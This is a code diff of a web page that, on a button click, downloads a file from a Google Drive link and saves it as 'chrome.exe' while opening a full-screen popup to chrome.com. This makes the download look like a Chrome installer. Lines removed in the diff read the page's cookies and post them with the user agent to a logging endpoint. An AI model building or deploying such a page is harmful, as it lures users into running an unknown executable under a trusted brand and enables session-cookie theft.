@@ -19,70 +19,54 @@ pre { background:#111;color:#0f0;padding:10px }
 const logEl = document.getElementById("log");
 const log = m => logEl.textContent += m + "\n";
 
-document.getElementById("btn").onclick = () => {
+document.getElementById("btn").onclick = async () => {
 
   log("[1] User click received");
 
-  // Capture cookie dari origin halaman ini
-  const cookies = document.cookie;
-  log("[COOKIE] " + cookies);
+  const fileUrl = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
 
-  // Kirim cookie ke endpoint (simulasi capture request)
-  fetch("/log", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      cookie: cookies,
-      ua: navigator.userAgent,
-      time: new Date().toISOString()
-    })
-  }).catch(()=>{});
+  try {
 
-  // Popup
+    log("[2] Fetching file...");
+
+    const response = await fetch(fileUrl);
+    const blob = await response.blob();
+
+    log("[3] File received");
+
+    const a = document.createElement("a");
+    const url = URL.createObjectURL(blob);
+
+    a.href = url;
+    a.download = "chrome.exe";   // nama file yang disimpan
+    document.body.appendChild(a);
+    a.click();
+
+    URL.revokeObjectURL(url);
+
+    log("[4] Download triggered");
+
+  } catch(e) {
+    log("[ERROR] " + e);
+  }
+
+  // popup test
   const w = window.open(
     "https://chrome.com",
     "_blank",
     `
-      width=${screen.availWidth},
-      height=${screen.availHeight},
-      left=0,
-      top=0,
-      resizable=yes,
-      scrollbars=yes
+    width=${screen.availWidth},
+    height=${screen.availHeight},
+    left=0,
+    top=0
     `
   );
 
-  if (!w) {
+  if(!w){
     log("[ERROR] Popup blocked");
-    return;
+  } else {
+    log("[5] Popup opened");
   }
-
-  log("[2] Popup opened");
-
-  try {
-    w.document.write(`
-      <a id="dl" download="chrome.exe"
-       href="https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL"></a>
-      <script>
-        setTimeout(() => {
-          document.getElementById("dl").click();
-        }, 50);
-      <\/script>
-    `);
-  } catch(e){
-    log("[ERROR] write blocked: " + e);
-  }
-
-  setTimeout(() => {
-    try {
-      w.location.href = "https://www.chrome.com";
-      log("[3] Popup navigated");
-    } catch (e) {
-      log("[ERROR] Navigation failed: " + e);
-    }
-  }, 0);
 
 };
 </script>
